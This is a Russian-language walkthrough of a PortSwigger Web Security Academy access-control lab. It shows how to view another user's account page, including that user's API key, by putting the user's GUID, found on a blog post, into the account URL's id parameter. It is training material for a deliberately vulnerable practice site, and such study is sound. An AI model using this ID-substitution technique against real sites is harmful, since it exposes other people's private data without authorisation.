Залогинимся под пользователем `wiener:peter` и перейдем на страницу с его аккаунтом
```
https://0a770002049105d480267193004c00bd.web-security-academy.net/my-account?id=15823d13-7aef-4342-a834-0b4ba5fc0c0c
```
И обратим внимание на `id` пользователя `id=15823d13-7aef-4342-a834-0b4ba5fc0c0c`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/7.%20Access%20control/8.%20User%20ID%20controlled%20by%20request%20parameter%2C%20with%20unpredictable%20user%20IDs/pics%20for%20walktrough/1.png)

Далее вернемся на корневую страницу с блогом, и найдем пост, который отправил пользователь с ником `carlos`. и нажмем на его ник
```
https://0a770002049105d480267193004c00bd.web-security-academy.net/my-account?id=68018a82-e3d5-4395-aa4e-7279f6631ac0
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/7.%20Access%20control/8.%20User%20ID%20controlled%20by%20request%20parameter%2C%20with%20unpredictable%20user%20IDs/pics%20for%20walktrough/2.png)

Далее заменим id `carlos` на наш, в надежде, что таким образом, мы получим возможность просматривать личные данные карлоса
```
https://0a770002049105d480267193004c00bd.web-security-academy.net/my-account?id=68018a82-e3d5-4395-aa4e-7279f6631ac0
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/7.%20Access%20control/8.%20User%20ID%20controlled%20by%20request%20parameter%2C%20with%20unpredictable%20user%20IDs/pics%20for%20walktrough/3.png)

И действительно, теперь мы залогинены как `carlos`, и видим его ключ к API, который мы и сдадим как ответ на задание
`Your API Key is: MdO3jkctfDI0ptBNCfIOU2HOycOs338S`



